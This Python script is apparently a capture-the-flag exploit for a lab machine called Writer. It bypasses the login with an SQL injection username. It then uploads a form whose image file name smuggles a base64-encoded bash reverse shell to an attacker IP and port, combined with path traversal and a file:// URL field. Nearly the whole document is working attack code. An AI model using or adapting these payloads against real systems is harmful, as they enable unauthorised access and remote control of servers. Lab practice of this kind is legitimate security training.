import requests
import base64
import urllib.parse


display = '''
# ======================= #
# Foothold for Writer.htb #
#           By ClutchTech #
# ======================= #
'''


class Foothold:
    def __init__(self):
        self.s = requests.Session()
        self.username = urllib.parse.quote("admin' or '1'='1")
        self.password = "DoesNotMatter"

        self.attacker_ip = '10.10.16.28'        # Change me
        self.attacker_listener_port = '4444'    # Change me
        self.reverse_shell = f'/bin/bash -i >& /dev/tcp/{self.attacker_ip}/{self.attacker_listener_port} 0>&1'.encode()
        self.payload = f"/../../../../../../dev/shm/noThanks.jpg;`echo {base64.b64encode(self.reverse_shell).decode()} | base64 -d | bash`"

        self.stories_url = f'http://writer.htb/dashboard/stories/add'

        self.evil_post_data = f'''-----------------------------4134880334892403016866246601
Content-Disposition: form-data; name="author"

noThanks
-----------------------------4134880334892403016866246601
Content-Disposition: form-data; name="title"

noThanks
-----------------------------4134880334892403016866246601
Content-Disposition: form-data; name="tagline"

noThanks
-----------------------------4134880334892403016866246601
Content-Disposition: form-data; name="image"; filename="{self.payload}"
Content-Type: application/jpeg


-----------------------------4134880334892403016866246601
Content-Disposition: form-data; name="image_url"

file:///{self.payload}

-----------------------------4134880334892403016866246601
Content-Disposition: form-data; name="content"

noThanks
-----------------------------4134880334892403016866246601--
'''

    def login(self):
        url = 'http://writer.htb/administrative'
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = f'uname={self.username}&password={self.password}'
        return self.s.post(url, headers=headers, data=data).status_code

    def injection(self):
        url = 'http://writer.htb/dashboard/stories/add'
        headers = {
            "Host": "writer.htb",
            "Referer": "http://writer.htb/dashboard/stories/add",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------4134880334892403016866246601"
        }
        return self.s.post(url, headers=headers, data=self.evil_post_data).status_code


if __name__ == '__main__':
    print(display, '\n')
    x = Foothold()
    if x.login() == 200:
        print('Login Successful. Injecting payload. Watch for reverse shell.')
        x.injection()
